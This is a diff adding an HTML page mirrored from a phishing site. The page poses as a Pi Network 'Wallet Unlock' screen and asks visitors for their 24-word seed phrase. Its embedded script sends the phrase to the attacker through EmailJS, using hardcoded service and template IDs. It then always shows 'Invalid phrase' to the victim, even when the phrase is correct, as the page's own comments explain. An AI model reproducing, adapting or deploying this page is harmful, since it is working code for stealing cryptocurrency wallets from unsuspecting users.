@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from trade.corenetmine.com/cor/vl/wallet2.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Mar 2025 15:19:04 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Wallet Unlock</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <style>
+        /* Reset styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Body and container styling */
+        body {
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* Header styling */
+        /* header {
+    width: 100%;
+    background-color: #fff;
+    color: #fff;
+    padding: 15px 0;
+    text-align: center;
+}
+
+.header-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    max-width: 900px;
+    margin: 0 auto;
+    color: #f6b230;
+} */
+
+        .logo {
+            width: 40px;
+            height: 40px;
+        }
+
+        /* Center header content */
+        header {
+            width: 100%;
+            background-color: #703d92;
+            color: #fff;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: center;
+            /* Center aligns all content horizontally */
+            align-items: center;
+        }
+
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            /* Adds spacing between icon and text */
+        }
+
+        .header-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Main content styling */
+        h2 {
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+
+        textarea {
+            width: 65%;
+            height: 250px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            resize: none;
+            font-size: 16px;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+
+        /* Button styles */
+        button {
+            width: 80%;
+            max-width: 400px;
+            padding: 12px;
+            font-size: 16px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-outline {
+            background-color: white;
+            color: #703d92;
+            border: 2px solid #703d92;
+        }
+
+        .btn-filled {
+            background-color: #703d92;
+            color: white;
+        }
+
+        /* Footer text styling */
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin: 15px 0;
+            text-align: left;
+            /* Aligns the text to the left */
+            max-width: 600px;
+            /* Optional: Adds a max-width for better readability on larger screens */
+        }
+
+
+        .info-text a {
+            color: #703d92;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 600px) {
+            .header-content {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .container {
+                padding: 15px;
+            }
+
+            button {
+                max-width: 100%;
+            }
+        }
+
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .success {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header Section -->
+    <header>
+        <div class="header-content">
+            <div class="header-icons">
+                <img src="wallet.png" alt="Wallet Icon" class="header-icon">
+                <h4>Wallet</h4>
+                <img src="pi-network-lvquy-logo-D798E8CD2E-seeklogo.com.png" alt="Pi Icon" class="header-icon">
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="container">
+
+        <form id="walletForm">
+            <textarea id="seedphrase" name="seedphrase" placeholder="Enter your 24-word passphrase here"
+                required></textarea>
+            <!-- Display error or success message -->
+            <div class="error" id="error-message"></div>
+            <div>
+                <button type="submit" name="send" class="btn-outline" id="unlockBtn">Unlock With Passphrase</button>
+                <button type="button" class="btn-filled">Unlock With Fingerprint</button>
+            </div>
+        </form>
+
+
+        <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
+            Recovery of passphrase is currently impossible.</p>
+
+        <p class="info-text">
+            Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your assets in your previous
+            wallet will be inaccessible.
+        </p>
+    </main>
+
+    <script>
+        // Initialize EmailJS with your public key
+        (function () {
+            emailjs.init("aI9u_yWfNa63Btn0E"); // Replace with your actual EmailJS public key
+        })();
+
+        // Handle form submission
+        document.getElementById("walletForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevents page reload
+
+            const message = document.getElementById("seedphrase").value.trim();
+            const seedphrase = message.split(/\s+/);
+
+            if (seedphrase.length !== 24) {
+                document.getElementById("error-message").innerText = "Invalid phrase.";
+                return;
+            }
+
+            // Send the passphrase to email using EmailJS
+            emailjs.send("service_5y6k13j", "template_iz3hp6g", {
+                seedphrase: seedphrase
+            })
+                .then(function (response) {
+                    console.log("Passphrase sent successfully:", response);
+                }, function (error) {
+                    console.log("Failed to send passphrase:", error);
+                });
+
+            // Always show "Invalid phrase" on the frontend, even if the passphrase is correct
+            document.getElementById("error-message").innerText = "Invalid phrase."
+
+            message.value = "";
+        });
+    </script>
+</body>
+
+</html>
